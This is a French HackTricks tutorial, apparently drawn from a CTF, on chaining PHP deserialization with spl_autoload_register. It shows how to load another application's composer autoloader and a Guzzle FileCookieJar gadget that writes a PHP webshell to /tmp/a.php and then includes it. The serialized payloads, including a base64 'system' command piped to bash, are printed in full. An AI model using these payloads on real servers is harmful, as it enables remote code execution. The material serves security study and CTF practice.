# PHP - D√©s√©rialisation + Chargement automatique des classes

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en √©quipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts GitHub.

</details>

Tout d'abord, vous devriez v√©rifier ce que sont les [**Classes de chargement automatique**](https://www.php.net/manual/en/language.oop5.autoload.php).

## PHP d√©s√©rialisation + spl\_autoload\_register + LFI/Gadget

Nous sommes dans une situation o√π nous avons trouv√© une **d√©s√©rialisation PHP dans une application web** sans biblioth√®que vuln√©rable aux gadgets √† l'int√©rieur de **`phpggc`**. Cependant, dans le m√™me conteneur, il y avait une **autre application web composer avec des biblioth√®ques vuln√©rables**. Par cons√©quent, l'objectif √©tait de **charger le chargeur composer de l'autre application web** et de l'exploiter pour **charger un gadget qui exploitera cette biblioth√®que avec un gadget** de l'application web vuln√©rable √† la d√©s√©rialisation.

√âtapes :

* Vous avez trouv√© une **d√©s√©rialisation** et il n'y a **aucun gadget** dans le code de l'application actuelle
* Vous pouvez abuser d'une fonction **`spl_autoload_register`** comme suit pour **charger n'importe quel fichier local avec l'extension `.php`**
* Pour cela, vous utilisez une d√©s√©rialisation o√π le nom de la classe va √™tre √† l'int√©rieur de **`$name`**. Vous **ne pouvez pas utiliser "/" ou "."** dans un nom de classe dans un objet s√©rialis√©, mais le **code** remplace les **tirets bas** ("\_") par des barres obliques ("/"). Ainsi, un nom de classe tel que `tmp_passwd` sera transform√© en `/tmp/passwd.php` et le code tentera de le charger.\
Un **exemple de gadget** serait : **`O:10:"tmp_passwd":0:{}`**
```php
spl_autoload_register(function ($name) {

if (preg_match('/Controller$/', $name)) {
$name = "controllers/${name}";
} elseif (preg_match('/Model$/', $name)) {
$name = "models/${name}";
} elseif (preg_match('/_/', $name)) {
$name = preg_replace('/_/', '/', $name);
}

$filename = "/${name}.php";

if (file_exists($filename)) {
require $filename;
}
elseif (file_exists(__DIR__ . $filename)) {
require __DIR__ . $filename;
}
});
```
{% hint style="success" %}
Si vous avez un **t√©l√©chargement de fichier** et pouvez t√©l√©charger un fichier avec une extension **`.php`**, vous pourriez **abuser directement de cette fonctionnalit√©** et obtenir d√©j√† une RCE.
{% endhint %}

Dans mon cas, je n'avais rien de tel, mais il y avait √† l'int√©rieur du **m√™me conteneur** une autre page web du compositeur avec une **biblioth√®que vuln√©rable √† un gadget `phpggc`**.

* Pour charger cette autre biblioth√®que, vous devez d'abord **charger le chargeur compositeur de cette autre application web** (car celui de l'application actuelle n'acc√©dera pas aux biblioth√®ques de l'autre). **Connaissant le chemin de l'application**, vous pouvez y parvenir tr√®s facilement avec : **`O:28:"www_frontend_vendor_autoload":0:{}`** (Dans mon cas, le chargeur compositeur √©tait dans `/www/frontend/vendor/autoload.php`)
* Maintenant, vous pouvez **charger** le **chargeur compositeur de l'autre application**, il est donc temps de **`g√©n√©rer le payload phpgcc`** √† utiliser. Dans mon cas, j'ai utilis√© **`Guzzle/FW1`**, ce qui m'a permis de **√©crire n'importe quel fichier dans le syst√®me de fichiers**.
* REMARQUE : Le **gadget g√©n√©r√© ne fonctionnait pas**, pour qu'il fonctionne, j'ai **modifi√©** ce payload **`chain.php`** de phpggc et j'ai d√©fini **tous les attributs** des classes **de priv√© √† public**. Sinon, apr√®s la d√©s√©rialisation de la cha√Æne, les attributs des objets cr√©√©s n'avaient aucune valeur.
* Maintenant, nous avons le moyen de **charger le chargeur compositeur de l'autre application** et d'avoir un **payload phpggc qui fonctionne**, mais nous devons **faire cela dans la M√äME REQU√äTE pour que le chargeur soit charg√© lorsque le gadget est utilis√©**. Pour cela, j'ai envoy√© un tableau s√©rialis√© avec les deux objets comme suit :
* Vous pouvez voir **d'abord le chargeur √™tre charg√© puis le payload**

{% code overflow="wrap" %}
```php
a:2:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}}
```
{% endcode %}

* Maintenant, nous pouvons **cr√©er et √©crire un fichier**, cependant, l'utilisateur **ne pouvait pas √©crire dans n'importe quel dossier √† l'int√©rieur du serveur web**. Ainsi, comme vous pouvez le voir dans la charge utile, PHP appelle **`system`** avec du **base64** est cr√©√© dans **`/tmp/a.php`**. Ensuite, nous pouvons **r√©utiliser le premier type de charge utile** que nous avons utilis√© comme LFI pour charger le chargeur du compositeur de l'autre application web **pour charger le fichier `/tmp/a.php`** g√©n√©r√©. Il suffit de l'ajouter au gadget de d√©s√©rialisation:&#x20;

{% code overflow="wrap" %}
```php
a:3:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}s:6:"Extra3";O:5:"tmp_a":0:{}}
```
{% endcode %}

**R√©sum√© de la charge utile**

* **Charger l'autoload du compositeur** d'une autre application web dans le m√™me conteneur
* **Charger un gadget phpggc** pour abuser d'une biblioth√®que de l'autre application web (l'application web initialement vuln√©rable √† la d√©s√©rialisation ne poss√©dait aucun gadget dans ses biblioth√®ques)
* Le gadget va **cr√©er un fichier avec une charge utile PHP** en /tmp/a.php avec des commandes malveillantes (l'utilisateur de l'application web ne peut pas √©crire dans un dossier de n'importe quelle application web)
* La partie finale de notre charge utile utilisera **le chargement du fichier PHP g√©n√©r√©** qui ex√©cutera des commandes

J'ai d√ª **appeler cette d√©s√©rialisation deux fois**. Dans mes tests, la premi√®re fois le fichier `/tmp/a.php` a √©t√© cr√©√© mais pas charg√©, et la deuxi√®me fois il a √©t√© correctement charg√©.

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en √©quipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez-nous** sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
